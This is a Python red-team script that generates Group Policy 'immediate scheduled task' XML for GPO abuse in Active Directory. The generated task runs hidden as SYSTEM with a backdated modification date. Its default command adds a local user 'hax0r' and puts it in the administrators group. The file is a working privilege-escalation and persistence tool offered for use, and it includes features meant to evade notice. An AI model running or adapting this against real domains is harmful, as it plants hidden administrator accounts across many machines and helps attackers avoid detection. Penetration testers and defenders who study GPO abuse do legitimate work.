#!/usr/bin/env python3

from datetime import datetime, timedelta
import uuid
from xml.sax.saxutils import escape
import argparse
import binascii
import os

script_description = """Generate XML file for "immediate scheduled task" GPO configuration. Template borrowed from \
https://github.com/rasta-mouse/GPO-Abuse/blob/master/scheduled-tasks.md and \
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 (see New-GPOImmediateTask - \
note this function has been discontinued in the latest version of PowerView). For usage info see \
https://rastamouse.me/2019/01/gpo-abuse-part-2/. Author: @airman604
"""
parser = argparse.ArgumentParser(description=script_description)
parser.add_argument('-n', '--name', help="name for the scheduled task, if not provided a random name in the form of 'TASK_########' is generated.")
parser.add_argument('-m', '--date', help="specify task modification date, should be in 'YYYY-MM-DD HH:MM:SS' format. If not provided current date -30 days is used.")
parser.add_argument('-d', '--description', help="specify task description, if not provided empty description is used.")
parser.add_argument('-c', '--command', help="command to execute, defaults to 'c:\\windows\\system32\\cmd.exe'", default='c:\\windows\\system32\\cmd.exe')
parser.add_argument('-a', '--args', help="command arguments, defaults to '/c \"net user hax0r Super1337 /add && net localgroup administrators hax0r /add\"'", default='/c "net user hax0r Super1337 /add && net localgroup administrators hax0r /add"')

args = parser.parse_args()

if not args.name:
    name = "TASK_"+binascii.b2a_hex(os.urandom(4)).decode('ascii')
else:
    name = escape(args.name)

if not args.date:
    mod_date = datetime.now() - timedelta(days=30)
    mod_date = mod_date.strftime("%Y-%m-%d %H:%M:%S")
else:
    mod_date = escape(args.date)

guid = str(uuid.uuid4()).upper()

author = "NT AUTHORITY\System"

if not args.description:
    description = ""
else:
    description = escape(args.description)

command = escape(args.command)

cmd_args = escape(args.args)

task_str = f"""<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{{CC63F200-7309-4ba0-B154-A71CD118DBCC}}"><ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{name}" image="0" changed="{mod_date}" uid="{{{guid}}}" userContext="0" removePolicy="0"><Properties action="C" name="{name}" runAs="NT AUTHORITY\System" logonType="S4U"><Task version="1.3"><RegistrationInfo><Author>{author}</Author><Description>{description}</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>S4U</LogonType></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings><Actions Context="Author"><Exec><Command>{command}</Command><Arguments>{cmd_args}</Arguments></Exec></Actions><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers></Task></Properties></ImmediateTaskV2></ScheduledTasks>"""
print(task_str)
